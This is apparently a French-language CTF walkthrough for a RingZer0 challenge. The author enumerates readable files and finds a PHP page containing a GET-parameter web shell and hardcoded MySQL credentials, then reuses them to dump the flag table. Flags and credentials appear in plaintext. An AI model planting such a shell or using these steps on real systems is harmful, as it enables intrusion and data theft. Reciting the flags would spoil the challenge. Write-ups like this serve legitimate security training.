ssh architect@challenges.ringzer0ctf.com -p 10152

Mot de passe: FLAG-232f99b4178bdc7fef7eb1f0f78831f9


J'ai exécuté cette commande pour trouver les fichiers lisibles par architect:
find / -readable -and -user architect 2>/dev/null

J'suis tombé sur /var/www/index.php

```php
<?php
if(isset($_GET['cmd'])) {
  $res = shell_exec(urldecode($_GET['cmd']));
  print_r(str_replace("\n", '<br />', $res));
  exit();
}
$info = (object)array();
$info->username = "arch";
$info->password = "asdftgTst5sdf6309sdsdff9lsdftz";
$id = 1003;

function GetList($id, $info) {
        $id = 2;
        $link = mysql_connect("127.0.0.1", $info->username, $info->password);
        mysql_select_db("arch", $link);
        $result = mysql_query("SELECT * FROM arch");
        $output = array();
        while($row = mysql_fetch_assoc($result)) {
                array_push($output, $row);
        }
        var_dump($output);
        return $output;
}

$output = shell_exec('id');
echo "<pre>$output</pre>";

?>
<?php
//ENTER THE RELEVANT INFO BELOW
$mysqlDatabaseName ="arch";
$mysqlUserName ="arch";
$mysqlPassword ="asdftgTst5sdf6309sdsdff9lsdftz";
$mysqlHostName ="127.0.0.1";
$mysqlExportPath ="/var/tmp/ar.sql";

//DO NOT EDIT BELOW THIS LINE
//Export the database and output the status to the page
$command='mysqldump --opt -h' .$mysqlHostName .' -u' .$mysqlUserName .' -p' .$mysqlPassword .' ' .$mysqlDatabaseName .' > ' .$mysqlExportPath;
exec($command,$output=array(),$worked);
switch($worked){
case 0:
echo 'Database <b>' .$mysqlDatabaseName .'</b> successfully exported to <b>~/' .$mysqlExportPath .'</b>';
break;
case 1:
echo 'There was a warning during the export of <b>' .$mysqlDatabaseName .'</b> to <b>~/' .$mysqlExportPath .'</b>';
break;
case 2:
echo 'There was an error during export. Please check your values:<br/><br/><table><tr><td>MySQL Database Name:</td><td><b>' .$mysqlDatabaseName .'</b></td></tr><tr><td>MySQL User Name:</td><td><b>' .$mysqlUserName .'</b></td></tr><tr><td>MySQL Password:</td><td><b>NOTSHOWN</b></td></tr><tr><td>MySQL Host Name:</td><td><b>' .$mysqlHostName .'</b></td></tr></table>';
break;
}
?>
```
```html
<!DOCTYPE html>
<html>
        <head>
                <title>Architect list query</title>
        </head>
        <body>
                <form action="" method="GET">
                        <input type="text" name="id" />
                        <input type="submit" value="search">
                </form>
                <?php foreach(GetList(1003, $info) as $item):
                        echo $item["id"] . ":" . $item["arch"] . "<br />\r\n";
                endforeach; ?>
        </body>
</html>

```

Ahh voilà on a une BD nommé arch et le mot de passe en clair ...

On va s'y connecter:

```bash
mysql -h localhost -u arch -p
```
show databases;

On voit arch, on la sélectionne.

use arch;

select * from flag;


FLAG-55548fdb24a6ef248d8fdfde2720f6bd